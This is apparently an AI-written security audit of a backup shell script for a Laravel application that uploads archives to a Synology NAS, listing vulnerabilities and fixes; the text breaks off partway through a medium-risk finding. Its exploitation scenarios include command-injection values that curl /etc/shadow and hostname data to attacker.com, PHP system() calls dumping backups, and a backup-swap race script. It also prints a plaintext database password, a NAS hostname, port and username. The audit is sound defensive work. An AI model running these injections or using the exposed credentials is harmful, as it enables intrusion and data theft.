# Security Audit: backup-run.sh
## Comprehensive Security Assessment - November 4, 2025

**Audited File**: `/var/www/api-gateway/scripts/backup-run.sh`
**Related Files**:
- `/var/www/api-gateway/scripts/send-backup-notification.sh`
- `/var/www/api-gateway/scripts/backup-system-state.sh`
- `/root/.my.cnf` (MySQL credentials)
- `/root/.ssh/synology_backup_key` (SSH private key)

**Audit Date**: 2025-11-04
**Auditor**: Security Audit Agent (Claude Code)

---

## Executive Summary

The backup script contains **4 CRITICAL**, **5 HIGH**, and **7 MEDIUM** risk security vulnerabilities. The most severe issues involve command injection via SSH remote command execution, insecure SSH configuration (disabled host key checking), credential exposure in emails and logs, and inadequate file permissions on sensitive directories.

**Overall Risk Score**: 🔴 **CRITICAL** (8.7/10)

**Immediate Actions Required**:
1. Fix SSH command injection vulnerability (lines 315-368)
2. Re-enable SSH host key verification
3. Remove sensitive paths from email notifications
4. Fix backup directory permissions (currently 755, should be 700)
5. Implement log sanitization for sensitive data

---

## 🔴 CRITICAL SECURITY ISSUES (Immediate Risk)

### CRIT-001: SSH Command Injection via Unsanitized Variables
**Severity**: CRITICAL (CVSS 9.8)
**Lines**: 315-368 (upload_to_synology function)
**CWE**: CWE-78 (OS Command Injection)

**Vulnerability**:
```bash
# Line 315-322 - Remote path construction
local remote_path="${SYNOLOGY_BASE_PATH}/${RETENTION_TIER}/${DATE_YEAR}/${DATE_MONTH}/${DATE_DAY}/${DATE_HOUR}${DATE_MINUTE:-00}"

ssh -i "$SYNOLOGY_SSH_KEY" \
    -o StrictHostKeyChecking=no \
    -p "$SYNOLOGY_PORT" \
    "${SYNOLOGY_USER}@${SYNOLOGY_HOST}" \
    "mkdir -p \"${remote_path}\"" || {
```

**Problem**: The `remote_path` variable is constructed from multiple environment variables and date components, then passed to SSH without proper sanitization. An attacker who can control environment variables (`SYNOLOGY_BASE_PATH`, `RETENTION_TIER`) can inject arbitrary commands.

**Exploitation Scenario**:
```bash
# Attacker sets malicious environment variable before script execution
export SYNOLOGY_BASE_PATH="/volume1/backup\"; curl http://attacker.com/exfil?data=\$(cat /etc/shadow | base64); echo \""

# When script executes, the SSH command becomes:
ssh ... "mkdir -p \"/volume1/backup\"; curl http://attacker.com/exfil?data=$(cat /etc/shadow | base64); echo \"/daily/2025/11/04/1100\""

# This creates the directory, exfiltrates /etc/shadow, and continues execution
```

**Impact**:
- Remote command execution on Synology NAS (RCE)
- Data exfiltration from NAS
- Privilege escalation on NAS
- Lateral movement to other systems

**Affected Lines**:
- Line 319: `mkdir -p` command
- Line 333: `cat >` command for upload
- Line 344: `sha256sum` verification
- Line 358: `mv` atomic move
- Line 368: `scp` checksum upload

**Fix Required**:
```bash
# Sanitize all variables used in SSH commands
sanitize_path() {
    local path="$1"
    # Remove dangerous characters: ; | & $ ( ) ` \ " ' newline
    echo "$path" | sed 's/[;&|$()<>`\\"'"'"']//g'
}

# Use sanitized paths
local safe_remote_path=$(sanitize_path "$remote_path")
ssh ... "mkdir -p '${safe_remote_path}'" || {
```

---

### CRIT-002: SSH Host Key Verification Disabled (MITM Attack Vector)
**Severity**: CRITICAL (CVSS 8.1)
**Lines**: 102, 316, 329, 341, 355, 365
**CWE**: CWE-295 (Improper Certificate Validation)

**Vulnerability**:
```bash
ssh -i "$SYNOLOGY_SSH_KEY" \
    -o StrictHostKeyChecking=no \  # ← DANGEROUS!
    -p "$SYNOLOGY_PORT" \
```

**Problem**: `StrictHostKeyChecking=no` disables SSH host key verification, making the connection vulnerable to Man-in-the-Middle (MITM) attacks.

**Exploitation Scenario**:
```
┌─────────┐                ┌──────────┐                ┌──────────┐
│ Server  │────────────────│ Attacker │────────────────│ Synology │
│         │   Backup       │  (MITM)  │   Intercepts   │   NAS    │
└─────────┘                └──────────┘                └──────────┘

1. Attacker performs ARP spoofing or DNS hijacking
2. Server connects to attacker's host (thinking it's Synology)
3. Attacker accepts connection (no host key validation)
4. Attacker receives entire backup archive with sensitive data
5. Attacker forwards traffic to real Synology (or drops it)
```

**Impact**:
- Complete backup interception (database dumps, .env files, credentials)
- SSH key theft (if attacker exploits authentication)
- Data modification in transit
- False success reports while data is stolen

**Fix Required**:
```bash
# Remove -o StrictHostKeyChecking=no entirely
# Add known_hosts entry on first manual connection:
ssh-keyscan -p "$SYNOLOGY_PORT" "$SYNOLOGY_HOST" >> /root/.ssh/known_hosts

# Then use normal SSH with host key verification:
ssh -i "$SYNOLOGY_SSH_KEY" \
    -o BatchMode=yes \
    -p "$SYNOLOGY_PORT" \
    "${SYNOLOGY_USER}@${SYNOLOGY_HOST}" \
    "mkdir -p '${remote_path}'"
```

---

### CRIT-003: Database Credentials Exposed in mysqldump Process
**Severity**: CRITICAL (CVSS 7.5)
**Lines**: 125-132
**CWE**: CWE-522 (Insufficiently Protected Credentials)

**Vulnerability**:
```bash
# Line 125-132
mysqldump --databases askproai_db \
    --single-transaction \
    --routines \
    --events \
    --triggers \
    --master-data=2 \
    --flush-logs \
    | gzip > "$db_file"
```

**Problem**: While credentials are stored in `/root/.my.cnf` (mode 600, good), the mysqldump process arguments are visible in `/proc/[pid]/cmdline` during execution. However, since credentials come from `.my.cnf`, this is **mitigated**. The real issue is that `.my.cnf` contains credentials in plaintext.

**Actual Vulnerability**:
```bash
# /root/.my.cnf (mode 600)
[client]
host = 127.0.0.1
port = 3306
user = askproai_user
password = askproai_secure_pass_2024  # ← Plaintext password
```

**Exploitation Scenario**:
```bash
# If attacker gains root access (even temporarily):
cat /root/.my.cnf
# Full database credentials exposed

# Or via file inclusion vulnerability in PHP:
include('/root/.my.cnf')
# Credentials leaked to attacker
```

**Impact**:
- Full database access if `.my.cnf` is compromised
- Credential exposure in backups (if .my.cnf is backed up)
- No credential rotation mechanism

**Fix Required**:
```bash
# Option 1: Use MySQL config encryption (MySQL 8.0+)
mysql_config_editor set \
    --login-path=backup \
    --host=127.0.0.1 \
    --user=askproai_user \
    --password
# Credentials stored in ~/.mylogin.cnf (encrypted)

# Option 2: Use environment variable from systemd secret
# /etc/systemd/system/backup.service
[Service]
LoadCredential=db_password:/etc/secrets/db_password
Environment=MYSQL_PWD=%d/db_password

# Then in script:
mysqldump --user=askproai_user --databases askproai_db ...
```

---

### CRIT-004: .env File Included in Backup Without Encryption
**Severity**: CRITICAL (CVSS 9.1)
**Lines**: 162-175
**CWE**: CWE-312 (Cleartext Storage of Sensitive Information)

**Vulnerability**:
```bash
# Line 162-175
# Backup application files (FULL BACKUP - includes vendor, node_modules)
# INCLUDE .env (critical for recovery)  # ← DANGER!
# INCLUDE vendor/ and node_modules/ for 100% offline recovery
tar -czf "$app_file" \
    -C "$PROJECT_ROOT" \
    --exclude="storage/framework/cache" \
    --exclude="storage/framework/sessions" \
    --exclude="storage/framework/views" \
    --exclude="storage/logs/*.log" \
    --exclude=".git" \
    .  # ← .env is included!
```

**Problem**: The `.env` file containing **all application secrets** is included in the backup archive **without encryption**. The archive is then uploaded to Synology NAS and potentially exposed.

**.env Typically Contains**:
```ini
APP_KEY=base64:... # Laravel encryption key
DB_PASSWORD=...    # Database password
REDIS_PASSWORD=... # Redis password
AWS_SECRET_KEY=... # Cloud credentials
STRIPE_SECRET=...  # Payment gateway secrets
JWT_SECRET=...     # Authentication secrets
MAIL_PASSWORD=...  # Email credentials
```

**Exploitation Scenario**:
```
1. Attacker gains access to Synology NAS (via CRIT-001 or CRIT-002)
2. Attacker downloads backup archive
3. Attacker extracts: tar -xzf backup-*.tar.gz
4. Attacker reads: cat .env
5. Attacker now has ALL application credentials
6. Attacker can:
   - Access production database
   - Impersonate any user (APP_KEY)
   - Access cloud resources (AWS keys)
   - Process fraudulent payments (Stripe keys)
```

**Impact**:
- **COMPLETE APPLICATION COMPROMISE**
- Database access
- User data breach (via APP_KEY decryption)
- Financial fraud (payment gateway keys)
- Cloud infrastructure takeover
- Email system abuse

**Current Security**: The backup is stored on Synology NAS which:
- ✅ Has file-level permissions
- ❌ No encryption at rest (unless Synology encryption enabled)
- ❌ No encryption in transit (via CRIT-002)
- ❌ No backup encryption before upload

**Fix Required**:
```bash
# Option 1: Encrypt .env separately with GPG
tar -czf "$app_file" \
    -C "$PROJECT_ROOT" \
    --exclude=".env" \  # Exclude from main backup
    --exclude="storage/framework/cache" \
    ...
    .

# Encrypt .env separately
gpg --encrypt \
    --recipient backup@askproai.de \
    --output "${WORK_DIR}/.env.gpg" \
    "${PROJECT_ROOT}/.env"

# Option 2: Encrypt entire backup archive
tar -czf - -C "$PROJECT_ROOT" . | \
    gpg --encrypt --recipient backup@askproai.de \
    > "$app_file.gpg"

# Option 3: Use age encryption (modern, simpler)
tar -czf - -C "$PROJECT_ROOT" . | \
    age -r age1... -o "$app_file.age"
```

---

## 🟠 HIGH RISK VULNERABILITIES (Significant Vulnerability)

### HIGH-001: Sensitive Paths Exposed in Email Notifications
**Severity**: HIGH (CVSS 6.5)
**Lines**: send-backup-notification.sh:170-225
**CWE**: CWE-209 (Generation of Error Message Containing Sensitive Information)

**Vulnerability**:
```bash
# send-backup-notification.sh lines 170-177
<span class="command-comment"># List backup directory on NAS</span>
ssh -i /root/.ssh/synology_backup_key -p ${nas_port} \\
  ${nas_user}@${nas_host} \\
  "ls -lh '${NAS_PATH}'"

<span class="command-comment"># Download backup to local /tmp/</span>
scp -i /root/.ssh/synology_backup_key -P ${nas_port} \\
  "${nas_user}@${nas_host}:${NAS_PATH}/${backup_file}" \\
  /tmp/
```

**Problem**: Email notifications contain:
- Full SSH private key path (`/root/.ssh/synology_backup_key`)
- Full NAS paths (`${NAS_PATH}` = `/volume1/homes/FSAdmin/Backup/Server AskProAI/...`)
- Usernames (`AskProAI`)
- Port numbers (50222)
- Hostnames (`fs-cloud1977.synology.me`)

**Exploitation Scenario**:
```
1. Attacker compromises email account (phishing, credential stuffing)
2. Attacker reads backup notification emails
3. Attacker extracts:
   - SSH key location: /root/.ssh/synology_backup_key
   - NAS hostname: fs-cloud1977.synology.me
   - SSH port: 50222
   - Username: AskProAI
   - Backup locations: /volume1/homes/FSAdmin/Backup/...
4. Attacker now knows exactly what to attack
5. Attacker attempts SSH brute force or exploits (knows port, user, key location)
```

**Impact**:
- Information disclosure facilitates targeted attacks
- Reduces attacker reconnaissance effort
- Email compromise = backup system reconnaissance complete

**Fix Required**:
```bash
# Sanitize paths in email notifications
# Replace full paths with descriptive labels
cat <<EOF
<span class="command-comment"># List backup directory on NAS</span>
ssh -i ~/.ssh/backup_key -p \${NAS_PORT} \\
  \${NAS_USER}@\${NAS_HOST} \\
  "ls -lh '\${BACKUP_PATH}'"
EOF

# Do NOT include:
# - Full file paths (use relative or basename only)
# - Specific hostnames (use "NAS server" or "backup.internal")
# - SSH key paths (use "backup key")
# - Exact ports (use "SSH port" or omit entirely)
```

---

### HIGH-002: Inadequate File Permissions on Backup Directory
**Severity**: HIGH (CVSS 6.8)
**Lines**: 443 (mkdir), permissions check reveals 755
**CWE**: CWE-732 (Incorrect Permission Assignment for Critical Resource)

**Current State**:
```bash
# Actual permissions found:
drwxr-xr-x 11 www-data www-data 4096  4. Nov 11:00 /var/backups/askproai
                                                    ^^^^^^^^^
# Owner: www-data (web server user) - DANGEROUS!
# Mode: 755 (world-readable) - VULNERABLE!
```

**Vulnerability**:
1. **Owner is `www-data`**: If web application has RCE vulnerability, attacker can access backups
2. **Mode is `755`**: Any user on system can read backup directory listing
3. **Group is `www-data`**: All web processes can access backups

**Exploitation Scenario**:
```bash
# Scenario 1: Web application RCE
# Attacker exploits PHP vulnerability and executes:
<?php system('ls -la /var/backups/askproai'); ?>
# Output: Full backup listing visible

<?php system('cat /var/backups/askproai/backup-20251104_110000.tar.gz | base64'); ?>
# Output: Entire backup exfiltrated through web application

# Scenario 2: Local privilege escalation
# Attacker gains access as low-privilege user (e.g., 'deploy', 'www-data')
$ ls -la /var/backups/askproai
# Success: Can see all backups

$ cat /var/backups/askproai/.size-history
# Success: Can infer backup patterns and timing

$ cp /var/backups/askproai/backup-latest.tar.gz /tmp/exfil.tar.gz
# Success: Backup stolen
```

**Impact**:
- Local privilege escalation vector
- Web application compromise → full system compromise
- Backup theft by any local user
- Information disclosure (backup size history, patterns)

**Fix Required**:
```bash
# Step 1: Change ownership to root
chown -R root:root /var/backups/askproai

# Step 2: Restrict permissions
chmod 700 /var/backups/askproai          # drwx------
chmod 600 /var/backups/askproai/*.tar.gz # -rw-------
chmod 600 /var/backups/askproai/.size-history

# Step 3: Update script to create with correct permissions
# Line 443 in backup-run.sh
mkdir -p "$WORK_DIR"
chmod 700 "$WORK_DIR"  # Add this line

# Line 261 in backup-run.sh (after archive creation)
chmod 600 "$FINAL_ARCHIVE"  # Add this line
```

---

### HIGH-003: Log File Contains Sensitive Information
**Severity**: HIGH (CVSS 6.2)
**Lines**: 65, 22
**CWE**: CWE-532 (Insertion of Sensitive Information into Log File)

**Vulnerability**:
```bash
# Current log permissions:
-rw-rw-r-- 1 root root 40132  4. Nov 11:00 /var/log/backup-run.log
# Mode: 664 (group-writable, world-readable) - DANGEROUS!
```

**Problem**: Log file contains:
- Full backup paths (including sensitive directory structures)
- NAS connection details (hostname, port, user)
- SHA256 checksums (can be used to verify stolen backups)
- Timing information (useful for attack timing)
- Error messages with system details

**Log Content Analysis**:
```bash
# Example log entries:
[2025-11-04 11:00:00] Starting backup: backup-20251104_110000
[2025-11-04 11:00:05] ✅ Synology NAS reachable
[2025-11-04 11:00:15] ✅ Database: 245 MB (compressed)
[2025-11-04 11:00:45] ✅ Application: 450 MB
[2025-11-04 11:00:50] ✅ Uploaded to: daily/2025/11/04/
[2025-11-04 11:00:51] ✅ SHA256: 7f3a2d1e4c5b6a8f...

# Information disclosed:
- Backup timing (3x daily at 03:00, 11:00, 19:00)
- Backup sizes (database growth rate, application size)
- NAS connectivity status
- Directory structure on NAS
```

**Exploitation Scenario**:
```bash
# Attacker gains read access to logs via:
# 1. Web application file disclosure vulnerability
# 2. Local user access (logs are world-readable)

# Attacker analysis:
tail -1000 /var/log/backup-run.log | grep "SHA256"
# Attacker learns: "I need SHA256 7f3a2d1e... to verify stolen backup"

tail -1000 /var/log/backup-run.log | grep "Uploaded"
# Attacker learns: "Backups stored in predictable path: daily/YYYY/MM/DD/"

tail -1000 /var/log/backup-run.log | grep "Starting backup"
# Attacker learns: "Backups run at 03:00, 11:00, 19:00 - attack at 03:05"
```

**Impact**:
- Timing information for attack windows
- Verification of stolen backups (SHA256)
- System reconnaissance (backup sizes, patterns)
- NAS topology discovery

**Fix Required**:
```bash
# Step 1: Secure log file permissions
chmod 600 /var/log/backup-run.log
chown root:root /var/log/backup-run.log

# Step 2: Implement log sanitization function
log() {
    local message="$1"
    # Sanitize sensitive patterns
    message=$(echo "$message" | sed -E \
        's|/volume1/homes/[^/]+|/volume1/homes/***|g' \
        's|SHA256: [0-9a-f]{16}|SHA256: ***|g' \
        's|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|***.***.***.***|g')
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $message" | tee -a "$LOG_FILE"
}

# Step 3: Add logrotate configuration with secure permissions
# /etc/logrotate.d/backup-run
/var/log/backup-run.log {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 0600 root root
}
```

---

### HIGH-004: Race Condition in Atomic Upload (TOCTOU)
**Severity**: HIGH (CVSS 6.0)
**Lines**: 324-361
**CWE**: CWE-367 (Time-of-check Time-of-use Race Condition)

**Vulnerability**:
```bash
# Lines 324-336: Upload to temporary file
local remote_tmp="${remote_path}/.${BACKUP_NAME}.tar.gz.tmp"
cat "$FINAL_ARCHIVE" | ssh ... "cat > '${remote_tmp}'" || {

# Lines 338-351: Verify checksum
local local_sha=$(awk '{print $1}' "${FINAL_ARCHIVE}.sha256")
local remote_sha=$(ssh ... "sha256sum '${remote_tmp}'" | awk '{print $1}')

if [ "$local_sha" != "$remote_sha" ]; then
    log "❌ Checksum mismatch!"
    return 2
fi

# Lines 353-361: Atomic move
ssh ... "mv '${remote_tmp}' '${remote_final}'" || {
```

**Problem**: Between checksum verification (line 344) and atomic move (line 358), there's a time window where:
1. File exists on NAS as `.${BACKUP_NAME}.tar.gz.tmp`
2. Checksum has been verified
3. File has not yet been moved to final location

**Exploitation Scenario**:
```bash
# Attacker with NAS access (via CRIT-001 or CRIT-002):

# 1. Attacker monitors for .tmp files
while true; do
    ls -la /volume1/homes/FSAdmin/Backup/*/*.tmp 2>/dev/null && break
    sleep 0.1
done

# 2. Attacker immediately replaces .tmp file with malicious backup
# (Race window: between checksum verification and mv)
sleep 0.5  # Wait for checksum verification to complete
cat /tmp/malicious-backup.tar.gz > /volume1/homes/FSAdmin/Backup/daily/2025/11/04/.backup-*.tmp

# 3. Script continues and moves malicious file to final location
# mv '.backup-*.tmp' 'backup-*.tar.gz'

# 4. Next restore uses malicious backup with backdoor
```

**Impact**:
- Backup integrity compromise
- Malicious code injection into backups
- Supply chain attack (compromised restore)
- Difficult to detect (checksum verified before replacement)

**Current Mitigation**:
- Atomic `mv` operation (good)
- Checksum verification (good)
- Time window is small (~1-2 seconds)

**Remaining Risk**:
- No re-verification after move
- No file locking mechanism
- No audit trail of file modifications

**Fix Required**:
```bash
# Option 1: Re-verify checksum after atomic move
ssh ... "mv '${remote_tmp}' '${remote_final}'" || {
    log "❌ Failed to finalize upload"
    return 1
}

# RE-VERIFY after move
local final_sha=$(ssh -i "$SYNOLOGY_SSH_KEY" \
    -p "$SYNOLOGY_PORT" \
    "${SYNOLOGY_USER}@${SYNOLOGY_HOST}" \
    "sha256sum '${remote_final}'" | awk '{print $1}')

if [ "$local_sha" != "$final_sha" ]; then
    log "❌ SECURITY: Checksum mismatch after move! Possible tampering!"
    ssh ... "rm '${remote_final}'"  # Delete suspicious file
    return 3
fi

# Option 2: Use SSH file locking
ssh ... "
    set -e
    # Lock file during operation
    lockfile=/tmp/backup-upload.lock
    exec 200>\$lockfile
    flock -x 200 || exit 1

    # Verify file hasn't been modified
    sha256sum '${remote_tmp}' > /tmp/sha_before
    mv '${remote_tmp}' '${remote_final}'
    sha256sum '${remote_final}' > /tmp/sha_after

    if ! cmp -s /tmp/sha_before /tmp/sha_after; then
        rm '${remote_final}'
        exit 2
    fi

    flock -u 200
"
```

---

### HIGH-005: No Backup Encryption Before Upload
**Severity**: HIGH (CVSS 7.3)
**Lines**: 254-275 (create_final_archive)
**CWE**: CWE-311 (Missing Encryption of Sensitive Data)

**Vulnerability**:
```bash
# Line 254-275: No encryption applied
tar -czf "$FINAL_ARCHIVE" -C "$WORK_DIR" . || {
    log "❌ Failed to create final archive"
    return 1
}

# Archive contains:
# - database.sql.gz (plaintext SQL dump)
# - application.tar.gz (includes .env with all secrets)
# - system-state.tar.gz (configuration files)
# - MANIFEST.json (metadata)

# Upload directly without encryption:
cat "$FINAL_ARCHIVE" | ssh ... "cat > '${remote_tmp}'"
```

**Problem**: Backup contains highly sensitive data but is:
- ❌ Not encrypted at rest (local /var/backups/)
- ❌ Not encrypted in transit (relies on SSH tunnel only)
- ❌ Not encrypted on NAS (unless Synology encryption enabled)

**Threat Model**:
```
Threat 1: SSH Tunnel Compromise (via CRIT-002)
├─ MITM attacker intercepts SSH connection
├─ Attacker receives plaintext backup data
└─ Impact: Full data breach

Threat 2: NAS Compromise
├─ Attacker gains NAS access (various methods)
├─ Attacker downloads backup files
└─ Impact: Full data breach (no encryption at rest)

Threat 3: Local Storage Compromise
├─ Attacker gains server access (limited privileges)
├─ Attacker reads /var/backups/ (via HIGH-002)
└─ Impact: Full data breach (no encryption at rest)

Threat 4: Insider Threat
├─ Malicious admin with NAS access
├─ Downloads backup files
└─ Impact: Undetectable data exfiltration
```

**Impact**:
- No defense-in-depth if any layer is compromised
- Backups are single point of failure
- Compliance violations (GDPR, PCI-DSS require encryption at rest)

**Fix Required**:
```bash
# Implement GPG encryption before upload
create_final_archive() {
    log "🗜️  Creating final backup archive..."

    # Create unencrypted archive
    local temp_archive="${WORK_DIR}/backup.tar.gz"
    tar -czf "$temp_archive" -C "$WORK_DIR" . || {
        log "❌ Failed to create archive"
        return 1
    }

    # Encrypt with GPG (recipient: backup@askproai.de)
    gpg --batch \
        --yes \
        --trust-model always \
        --encrypt \
        --recipient backup@askproai.de \
        --output "$FINAL_ARCHIVE" \
        "$temp_archive" || {
        log "❌ Failed to encrypt backup"
        return 1
    }

    # Securely delete unencrypted archive
    shred -vfz -n 3 "$temp_archive"

    # Generate checksum of ENCRYPTED file
    sha256sum "$FINAL_ARCHIVE" > "${FINAL_ARCHIVE}.sha256"

    log "   ✅ Backup encrypted with GPG"
    return 0
}

# Restore process would require:
# 1. Download encrypted backup from NAS
# 2. Decrypt with GPG private key (secured separately)
# 3. Extract backup files
gpg --decrypt backup-20251104_110000.tar.gz.gpg | tar -xzf -
```

---

## 🟡 MEDIUM RISK VULNERABILITIES (Potential Issues)

### MED-001: Insufficient Input Validation on Environment Variables
**Severity**: MEDIUM (CVSS 5.3)
**Lines**: 25-29
**CWE**: CWE-20 (Improper Input Validation)

**Vulnerability**:
```bash
# Lines 25-29: No validation on environment variables
: ${SYNOLOGY_HOST:="fs-cloud1977.synology.me"}
: ${SYNOLOGY_PORT:="50222"}
: ${SYNOLOGY_USER:="AskProAI"}
: ${SYNOLOGY_SSH_KEY:="/root/.ssh/synology_backup_key"}
: ${SYNOLOGY_BASE_PATH:="/volume1/homes/FSAdmin/Backup/Server AskProAI"}
```

**Problem**: Environment variables are used directly without validation:
- No format validation (e.g., `SYNOLOGY_PORT` could be "abc" or "-1")
- No range validation (e.g., port must be 1-65535)
- No path traversal prevention in `SYNOLOGY_BASE_PATH`
- No hostname validation (could contain shell metacharacters)

**Exploitation Scenario**:
```bash
# Attacker modifies environment before script execution
export SYNOLOGY_PORT="50222; curl http://attacker.com/exfil?backup=\$(hostname)"
export SYNOLOGY_BASE_PATH="../../../../../etc"
export SYNOLOGY_HOST="127.0.0.1"  # Redirect to localhost

# Script executes with malicious values
ssh -p "50222; curl http://attacker.com/exfil?backup=$(hostname)" ...
# Command injection occurs
```

**Fix Required**:
```bash
# Add validation function
validate_config() {
    # Validate port is numeric and in valid range
    if ! [[ "$SYNOLOGY_PORT" =~ ^[0-9]+$ ]] || [ "$SYNOLOGY_PORT" -lt 1 ] || [ "$SYNOLOGY_PORT" -gt 65535 ]; then
        log "❌ Invalid SYNOLOGY_PORT: $SYNOLOGY_PORT"
        exit 1
    fi

    # Validate hostname format
    if ! [[ "$SYNOLOGY_HOST" =~ ^[a-zA-Z0-9.-]+$ ]]; then
        log "❌ Invalid SYNOLOGY_HOST: $SYNOLOGY_HOST"
        exit 1
    fi

    # Validate SSH key exists and is readable
    if [ ! -r "$SYNOLOGY_SSH_KEY" ]; then
        log "❌ SSH key not found or not readable: $SYNOLOGY_SSH_KEY"
        exit 1
    fi

    # Validate base path doesn't contain dangerous patterns
    if [[ "$SYNOLOGY_BASE_PATH" =~ \.\.|;\||&|\$ ]]; then
        log "❌ Invalid SYNOLOGY_BASE_PATH: $SYNOLOGY_BASE_PATH"
        exit 1
    fi
}

# Call validation before use
validate_config
```

---

### MED-002: Database Dump Contains Sensitive Binary Log Position
**Severity**: MEDIUM (CVSS 5.0)
**Lines**: 125-132, 150
**CWE**: CWE-209 (Generation of Error Message Containing Sensitive Information)

**Vulnerability**:
```bash
# Line 130: Binary log position recorded in dump
--master-data=2 \

# Line 150: Position exposed in metadata
Binlog Position: $(grep "^-- CHANGE MASTER" "$db_file" 2>/dev/null | head -1 || echo "Not recorded")
```

**Problem**: Binary log position reveals:
- Database replication topology
- Transaction timing
- Database activity level
- Potential for replay attacks

**Example Binary Log Position**:
```sql
-- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000042', MASTER_LOG_POS=1234567890;
```

**Information Disclosed**:
- Log file sequence number (000042 = 42 binlog rotations)
- Current position (1234567890 bytes = ~1.15 GB of transactions)
- Can infer: database age, activity level, transaction volume

**Exploitation Scenario**:
```bash
# Attacker obtains old backup and current backup
grep "CHANGE MASTER" old-backup/database.sql.gz | zcat
# -- MASTER_LOG_FILE='mysql-bin.000042', MASTER_LOG_POS=1000000000

grep "CHANGE MASTER" new-backup/database.sql.gz | zcat
# -- MASTER_LOG_FILE='mysql-bin.000042', MASTER_LOG_POS=1234567890

# Attacker calculates:
# 234,567,890 bytes of transactions in 8 hours (between backups)
# = ~29.3 MB/hour transaction rate
# = High activity database

# Attacker also knows:
# - Only 42 binlog rotations since deployment
# - Binlog size likely 1GB (standard)
# - Database approximately 42 days old (if daily rotation)
```

**Impact**:
- Information disclosure for attack planning
- Replication topology exposure
- Transaction timing information

**Fix Required**:
```bash
# Option 1: Remove binlog position from backup
mysqldump --databases askproai_db \
    --single-transaction \
    --routines \
    --events \
    --triggers \
    # --master-data=2 \  # REMOVE THIS LINE
    --flush-logs \
    | gzip > "$db_file"

# Option 2: Store binlog position separately (encrypted)
mysqldump ... | gzip > "$db_file"

# Store binlog position in separate encrypted file
mysql -e "SHOW MASTER STATUS\G" | \
    gpg --encrypt --recipient backup@askproai.de \
    > "${WORK_DIR}/binlog-position.gpg"
```

---

### MED-003: Size Anomaly Detection Threshold Too High
**Severity**: MEDIUM (CVSS 4.5)
**Lines**: 277-305
**CWE**: CWE-754 (Improper Check for Unusual or Exceptional Conditions)

**Vulnerability**:
```bash
# Lines 289-296: 50% deviation threshold
if [ "$avg_size" -gt 0 ]; then
    local deviation=$(( (current_size - avg_size) * 100 / avg_size ))

    if [ "$deviation" -gt 50 ] || [ "$deviation" -lt -50 ]; then
        log "⚠️  SIZE ANOMALY: ${deviation}% deviation from average"
        send_alert "Backup size anomaly: ${deviation}% deviation" "warning"
    fi
fi
```

**Problem**: 50% threshold is too permissive:
- Allows 50% increase (e.g., 200MB → 300MB) without alert
- Allows 50% decrease (e.g., 200MB → 100MB) without alert
- Data exfiltration could occur within this window
- Data loss could occur without detection

**Attack Scenario**:
```bash
# Scenario 1: Gradual data exfiltration
# Attacker adds 40MB of exfiltrated data to backup each day
Day 1: 200MB (normal)
Day 2: 240MB (+20% - no alert)
Day 3: 280MB (+40% - no alert)
Day 4: 320MB (+60% - ALERT, but 120MB already exfiltrated)

# Scenario 2: Backup corruption
# Backup process fails silently, creates small corrupt file
Normal: 200MB
Corrupt: 120MB (-40% - no alert)
# Restore fails catastrophically
```

**Impact**:
- Delayed detection of backup manipulation
- Data exfiltration goes unnoticed
- Backup corruption not detected early
- False confidence in backup integrity

**Fix Required**:
```bash
# Lower thresholds for better detection
check_size_anomaly() {
    local current_size=$1

    if [ ! -f "$SIZE_HISTORY_FILE" ]; then
        echo "$current_size" > "$SIZE_HISTORY_FILE"
        return 0
    fi

    local avg_size=$(tail -7 "$SIZE_HISTORY_FILE" | awk '{sum+=$1} END {if(NR>0) print sum/NR; else print 0}')

    if [ "$avg_size" -gt 0 ]; then
        local deviation=$(( (current_size - avg_size) * 100 / avg_size ))

        # CRITICAL: >30% or <-30%
        if [ "$deviation" -gt 30 ] || [ "$deviation" -lt -30 ]; then
            log "🚨 CRITICAL SIZE ANOMALY: ${deviation}% deviation"
            send_alert "CRITICAL: Backup size ${deviation}% deviation from average" "critical"

            # Optional: Block backup upload on critical anomaly
            if [ "$deviation" -gt 50 ] || [ "$deviation" -lt -50 ]; then
                log "❌ Blocking upload due to extreme size deviation"
                return 1
            fi
        # WARNING: >15% or <-15%
        elif [ "$deviation" -gt 15 ] || [ "$deviation" -lt -15 ]; then
            log "⚠️  SIZE ANOMALY: ${deviation}% deviation"
            send_alert "Backup size anomaly: ${deviation}% deviation" "warning"
        fi
    fi

    echo "$current_size" >> "$SIZE_HISTORY_FILE"
    tail -30 "$SIZE_HISTORY_FILE" > "${SIZE_HISTORY_FILE}.tmp"
    mv "${SIZE_HISTORY_FILE}.tmp" "$SIZE_HISTORY_FILE"
}
```

---

### MED-004: External Service Call Without Timeout (ifconfig.me)
**Severity**: MEDIUM (CVSS 4.3)
**Lines**: 226
**CWE**: CWE-400 (Uncontrolled Resource Consumption)

**Vulnerability**:
```bash
# Line 226: External HTTP call in manifest creation
"server_ip": "$(curl -s -4 ifconfig.me || echo 'unknown')",
```

**Problem**:
- No timeout specified on `curl` command
- Depends on external service (ifconfig.me)
- Could hang indefinitely if service is down
- Blocks backup process during manifest creation

**Exploitation Scenario**:
```bash
# Scenario 1: DDoS on ifconfig.me
# Attacker floods ifconfig.me with requests
# Service becomes slow or unresponsive
# Backup script hangs at manifest creation
# Backup window missed (scheduled at 03:00, 11:00, 19:00)

# Scenario 2: DNS hijacking
# Attacker poisons DNS for ifconfig.me
# Points to attacker-controlled server that never responds
# curl hangs indefinitely
# Backup process blocked

# Scenario 3: Network partition
# Network route to ifconfig.me fails
# curl waits for TCP timeout (default: 2 minutes)
# Backup delayed by 2 minutes per attempt
```

**Impact**:
- Backup process hang (2-minute timeout)
- Missed backup windows
- Dependency on external service
- Potential information disclosure (IP address leaked to ifconfig.me)

**Fix Required**:
```bash
# Option 1: Add timeout and use local method
"server_ip": "$(timeout 5 curl -s -4 ifconfig.me 2>/dev/null || \
                  ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127' | head -1 || \
                  echo 'unknown')",

# Option 2: Use local network interface query (preferred)
"server_ip": "$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo 'unknown')",

# Option 3: Remove IP address entirely (not critical for backup)
# "hostname": "$(hostname)",
# Remove server_ip field entirely
```

---

### MED-005: Predictable Backup Naming Pattern
**Severity**: MEDIUM (CVSS 4.8)
**Lines**: 32-41, 312
**CWE**: CWE-330 (Use of Insufficiently Random Values)

**Vulnerability**:
```bash
# Lines 32-41: Predictable backup naming
